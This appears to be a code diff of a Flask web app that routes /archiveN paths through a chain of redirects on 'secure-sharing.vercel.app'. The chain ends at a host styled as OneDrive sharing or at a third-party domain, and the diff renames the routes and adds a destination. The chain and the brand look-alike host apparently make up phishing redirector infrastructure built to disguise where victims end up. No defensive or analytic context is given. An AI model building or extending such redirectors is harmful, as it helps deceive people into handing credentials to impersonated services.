@@ -4,30 +4,34 @@ app = Flask(__name__)
 
 # Define redirection rules based on path
 def get_redirect_url(path):
-    if path == '/path1':
-        return 'https://secure-sharing.vercel.app/path2'
-    elif path == '/path2':
-        return 'https://secure-sharing.vercel.app/path3'
-    elif path == '/path3':
-        return 'https://secure-sharing.vercel.app/path4'
-    elif path == '/path4':
-        return 'https://secure-sharing.vercel.app/path5'
-    elif path == '/path5':
-        return 'https://secure-sharing.vercel.app/path6'
-    elif path == '/path6':
-        return 'https://secure-sharing.vercel.app/path7'
-    elif path == '/path7':
-        return 'https://secure-sharing.vercel.app/path8'
-    elif path == '/path8':
+    if path == '/archive1':
+        return 'https://secure-sharing.vercel.app/archive2'
+    elif path == '/archive2':
+        return 'https://secure-sharing.vercel.app/archive3'
+    elif path == '/archive3':
+        return 'https://secure-sharing.vercel.app/archive4'
+    elif path == '/archive4':
+        return 'https://secure-sharing.vercel.app/archive5'
+    elif path == '/archive5':
+        return 'https://secure-sharing.vercel.app/archive6'
+    elif path == '/archive6':
+        return 'https://secure-sharing.vercel.app/archive7'
+    elif path == '/archive7':
+        return 'https://secure-sharing.vercel.app/archive8'
+    elif path == '/archive8':
+        return 'https://onedrive-sharing.vercel.app/'
+    elif path == '/archive3467':
+        return 'https://theme.redon.ae/archive/'
+    elif path == '/archive9':
         return 'https://onedrive-sharing.vercel.app/'
     # Add more cases for additional paths and intermediary URLs as needed
     else:
         return 'https://onedrive-sharing.vercel.app/'
 
 # Route to handle redirection for paths '/path1' to '/path8'
-@app.route('/path<int:num>')
+@app.route('/archive<int:num>')
 def path_handler(num):
-    path = f'/path{num}'
+    path = f'/archive{num}'
     redirect_url = get_redirect_url(path)
     return render_template('redirect.html', redirect_url=redirect_url)
 
